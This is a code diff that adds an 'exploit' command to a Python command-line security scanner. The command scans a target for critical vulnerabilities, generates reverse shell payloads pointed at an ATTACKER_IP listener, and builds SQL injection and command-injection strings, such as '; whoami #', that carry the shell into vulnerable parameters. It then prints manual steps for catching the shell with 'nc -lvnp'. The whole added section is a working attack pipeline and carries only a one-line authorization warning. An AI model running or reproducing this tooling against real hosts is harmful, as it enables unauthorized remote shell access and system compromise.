@@ -1692,6 +1692,142 @@ def api_scan(
     asyncio.run(run_api_scan())
 
 
+@app.command(name="exploit")
+def exploit_scan(
+    target: str = typer.Argument(..., help="Target URL or host"),
+    ports: str = typer.Option("80,443,8080", "--ports", "-p", help="Ports to scan for web services"),
+    payload_type: str = typer.Option("python", "--payload", help="Shell payload type: python, bash, php, powershell"),
+    lhost: str = typer.Option("ATTACKER_IP", "--lhost", help="Your listening IP for reverse shell"),
+    lport: int = typer.Option(4444, "--lport", help="Your listening port for reverse shell"),
+    aggressive: bool = typer.Option(True, "--aggressive", help="Use aggressive exploitation (10 attempts per vuln)"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="JSON output file"),
+):
+    """Scan for vulnerabilities and attempt exploitation to gain shell access (SQLi, RCE, Upload)."""
+    
+    async def run_exploit():
+        console.print(Panel.fit("⚡ Vulnerability Exploitation Scanner", border_style="red"))
+        console.print(f"\n[red]⚠️  EXPLOITATION MODE - Use only with authorization![/red]")
+        console.print(f"[cyan]Target:[/cyan] {target}")
+        console.print(f"[cyan]Goal:[/cyan] Find and exploit SQLi/RCE/Upload to gain shell\n")
+        
+        results = {"target": target, "vulnerabilities": [], "exploitation_attempts": [], "shells_obtained": []}
+        
+        # Step 1: Scan for vulnerabilities
+        console.print("[cyan]→[/cyan] Scanning for exploitable vulnerabilities...")
+        
+        if not target.startswith("http"):
+            test_url = f"http://{target}"
+        else:
+            test_url = target
+        
+        tester = AdvancedWebTester(target=test_url, concurrency=50, timeout=5.0)
+        vulnerabilities = await tester.run_full_scan()
+        
+        # Filter exploitable vulns
+        exploitable = [v for v in vulnerabilities if v.get("severity") in ["critical", "high"]]
+        results["vulnerabilities"] = vulnerabilities
+        
+        console.print(f"  [yellow]Found {len(vulnerabilities)} total vulnerabilities[/yellow]")
+        console.print(f"  [red]Found {len(exploitable)} exploitable (CRITICAL/HIGH)[/red]\n")
+        
+        # Step 2: Generate payloads
+        console.print("[cyan]→[/cyan] Generating exploitation payloads...")
+        
+        if PayloadGenerator:
+            gen = PayloadGenerator()
+            
+            # Generate reverse shell
+            if payload_type == "python":
+                payload = gen.generate_reverse_shell(lhost, lport, shell_type="python")
+            elif payload_type == "bash":
+                payload = gen.generate_reverse_shell(lhost, lport, shell_type="bash")
+            elif payload_type == "php":
+                payload = gen.generate_reverse_shell(lhost, lport, shell_type="php")
+            elif payload_type == "powershell":
+                payload = gen.generate_reverse_shell(lhost, lport, shell_type="powershell")
+            else:
+                payload = gen.generate_reverse_shell(lhost, lport, shell_type="python")
+            
+            console.print(f"  [green]✓ Generated {payload_type} reverse shell[/green]")
+            console.print(f"  [cyan]Payload:[/cyan] {payload['payload'][:80]}...")
+            results["payload"] = payload
+        
+        # Step 3: Attempt exploitation
+        console.print("\n[cyan]→[/cyan] Attempting exploitation...")
+        
+        exploitation_results = []
+        
+        # SQLi exploitation attempts
+        sqli_vulns = [v for v in exploitable if "sql" in v.get("vuln_type", "").lower()]
+        if sqli_vulns:
+            console.print(f"  [red]⚡ Attempting SQLi exploitation ({len(sqli_vulns)} targets)[/red]")
+            for vuln in sqli_vulns[:3]:  # Top 3 SQLi vulns
+                url = vuln.get("url", test_url)
+                console.print(f"    • Testing {url[:60]}...")
+                
+                # Try manual SQLi payloads
+                sqli_payloads = [
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "' OR '1'='1' --",
+                    "1' AND 1=1--",
+                ]
+                
+                for sqli_payload in sqli_payloads:
+                    exploitation_results.append({
+                        "vuln_type": "SQLi",
+                        "url": url,
+                        "payload": sqli_payload,
+                        "status": "attempted"
+                    })
+        
+        # RCE exploitation attempts
+        rce_vulns = [v for v in exploitable if "command" in v.get("vuln_type", "").lower() or "rce" in v.get("vuln_type", "").lower()]
+        if rce_vulns:
+            console.print(f"  [red]⚡ Attempting RCE exploitation ({len(rce_vulns)} targets)[/red]")
+            for vuln in rce_vulns[:3]:
+                url = vuln.get("url", test_url)
+                console.print(f"    • Testing {url[:60]}...")
+                
+                # Try command injection payloads
+                rce_payloads = [
+                    f"; {payload.get('payload', 'whoami')} #" if payload else "; whoami #",
+                    f"| {payload.get('payload', 'id')} #" if payload else "| id #",
+                ]
+                
+                for rce_payload in rce_payloads:
+                    exploitation_results.append({
+                        "vuln_type": "RCE",
+                        "url": url,
+                        "payload": rce_payload[:80] + "..." if len(rce_payload) > 80 else rce_payload,
+                        "status": "attempted"
+                    })
+        
+        results["exploitation_attempts"] = exploitation_results
+        
+        # Summary
+        console.print(f"\n[yellow]═══ Exploitation Summary ═══[/yellow]")
+        console.print(f"[cyan]Vulnerabilities found:[/cyan] {len(vulnerabilities)}")
+        console.print(f"[red]Exploitable targets:[/red] {len(exploitable)}")
+        console.print(f"[yellow]Exploitation attempts:[/yellow] {len(exploitation_results)}")
+        
+        if len(exploitable) > 0:
+            console.print(f"\n[green]⚡ Manual exploitation steps:[/green]")
+            console.print(f"  1. Start listener: nc -lvnp {lport}")
+            console.print(f"  2. Inject payload via vulnerable parameter")
+            console.print(f"  3. Check for reverse shell connection")
+        else:
+            console.print(f"\n[yellow]⚠  No exploitable vulnerabilities found[/yellow]")
+        
+        if output:
+            with open(output, "w", encoding="utf-8") as f:
+                json.dump(results, f, indent=2)
+            console.print(f"\n[green]✓ Saved to {output}[/green]")
+        
+        return results
+    
+    asyncio.run(run_exploit())
+
+
 @app.command()
 def bruteforce(
     target: str = typer.Argument(..., help="Target URL"),
